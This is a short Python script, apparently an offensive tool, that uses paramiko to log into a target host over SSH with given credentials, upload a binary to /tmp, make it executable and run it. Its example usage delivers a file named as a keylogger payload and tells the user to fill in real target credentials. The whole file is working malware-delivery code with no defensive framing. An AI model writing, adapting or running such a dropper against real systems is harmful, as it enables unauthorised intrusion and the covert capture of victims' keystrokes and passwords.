import paramiko
import os

def send_and_execute_payload(target_ip, username, password,
                             local_payload_path, remote_path="/tmp/payload.bin"):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print(f"Connecting to {target_ip}...")
        ssh.connect(target_ip, username=username, password=password)

        sftp = ssh.open_sftp()
        print(f"Uploading payload to {remote_path} ...")
        sftp.put(local_payload_path, remote_path)
        sftp.chmod(remote_path, 0o755)
        sftp.close()

        print(f"Executing payload on {target_ip} ...")
        stdin, stdout, stderr = ssh.exec_command(remote_path)
        print("Payload output:")
        print(stdout.read().decode())
        print(stderr.read().decode())

        ssh.close()
        print("[+] Payload delivered and executed successfully.")
    except Exception as e:
        print(f"[!] Error delivering payload: {e}")

# Example usage (replace with your real target creds):
if __name__ == "__main__":
    send_and_execute_payload(
        target_ip="192.168.1.10",
        username="user",
        password="password",
        local_payload_path="../payloads_generated/keylogger_payload.bin"
    )
